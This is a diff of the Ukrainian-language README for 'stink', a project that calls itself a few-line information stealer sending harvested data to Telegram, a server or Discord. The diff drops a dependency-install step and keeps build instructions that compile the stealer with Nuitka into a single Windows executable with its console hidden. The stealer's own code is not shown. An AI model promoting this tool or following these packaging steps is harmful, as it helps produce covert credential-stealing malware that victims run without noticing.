@@ -1,6 +1,6 @@
 # stink
 
-Стилер всього лише в декілька рядків з відправкою до Telegram / Server / Discord.
+Стилер всього лише в декілька рядків з відправкою до Telegram / Server / Discord. Без залежностей, тільки вбудовані бібліотеки.
 
 **Wiki:** https://github.com/FallenAstaroth/stink/wiki
 
@@ -147,19 +147,15 @@ virtualenv venv
 ```
 venv\Scripts\activate
 ```
-5. Встановлюємо залежності:
-````
-pip install -r requirements.txt
-````
-6. Встановлюємо Nuitka:
+5. Встановлюємо Nuitka:
 ````
 pip install Nuitka==0.6.16.4
 ````
-7. Для зменшення розміру файла додатково встановлюємо Zstandard (опціонально):
+6. Для зменшення розміру файла додатково встановлюємо Zstandard (опціонально):
 ```
 pip install zstandard==0.17.0
 ```
-8. Прописуємо команду:
+7. Прописуємо команду:
 ```
 nuitka --onefile --plugin-enable=multiprocessing --windows-disable-console test.py
 ```
